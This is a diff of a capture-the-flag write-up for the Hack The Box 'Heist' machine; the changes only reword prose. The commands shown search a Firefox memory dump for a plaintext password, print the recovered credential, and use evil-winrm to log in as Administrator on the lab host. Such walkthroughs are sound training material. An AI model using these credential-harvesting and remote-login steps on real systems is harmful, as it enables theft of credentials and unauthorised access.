@@ -532,16 +532,16 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----                                                                                                                                                                                                    
 -a----       10/10/2019   5:29 AM      466390945 firefox_6152.dmp    
 ```
-Cool - so that worked, but there is a lot of shit in this thing and its something like 466MB, yikes. In comes the helpful get-content command: [Get-Content Manpage](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-6)
+Cool - so that worked, but there is a lot of shit in this thing and its something like 466MB, yikes. In comes the helpful get-content command: [Get-Content manpage](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-6)
 
-Lets try to just look for the word password?:
+Lets try to just look for the string password? That seems like the easiest way, I honestly have no idea what to look for.
 
 ```console
 Evil-WinRM* PS C:\Users\Chase\Documents> gc firefox_6152.dmp | % { if($_match "password") {write-host %_}}
 
 localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
 ```
-Word - lets try to connect with that?
+Great, that seems like a password potentially - lets try to connect with that?
 
 ```console
 root@endeavour:~/htb/heist/evil-winrm# ./evil-winrm.rb -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
@@ -569,10 +569,5 @@ Mode                LastWriteTime         Length Name
 Root!
 
 # Conclusion
-One of the largest takeaways from this box was an amendment to my initial enumeration. I should always check all of the ports -- not just the popular ones. 
-
-# References
-
-
-
+The biggest takeaway from this box was an amendment to my initial enumeration process. I should always check all of the ports -- not just the popular ones. Otherwise this box was pretty fun, the memory dump was something I hadn't ever done before and was pretty interesting.
 
